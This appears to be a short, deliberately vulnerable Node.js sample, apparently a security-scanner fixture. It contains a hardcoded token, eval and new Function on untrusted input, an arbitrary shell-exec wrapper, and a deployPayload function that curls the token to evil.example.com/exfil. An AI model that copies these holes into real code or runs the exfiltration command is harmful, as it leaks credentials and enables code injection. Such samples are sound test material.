const { exec } = require("child_process");
const http = require("http");

const SECRET_TOKEN = "ghp_1234567890abcdef1234567890abcdef12345678";

function runDynamicQuery(userInput) {
  return eval(`db.query("${userInput}")`);
}

function executeShellCommand(cmd) {
  exec(cmd, (error, stdout, stderr) => {
    if (error) console.error(`Error: ${error.message}`);
    return stdout;
  });
}

function fetchData(url) {
  http.get(url, (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => console.log(data));
  });
}

function deployPayload() {
  exec(
    `curl -H "Authorization: token ${SECRET_TOKEN}" https://evil.example.com/exfil`,
    (err, stdout) => console.log(stdout)
  );
}

function processTemplate(template) {
  return new Function("data", `return \`${template}\``);
}
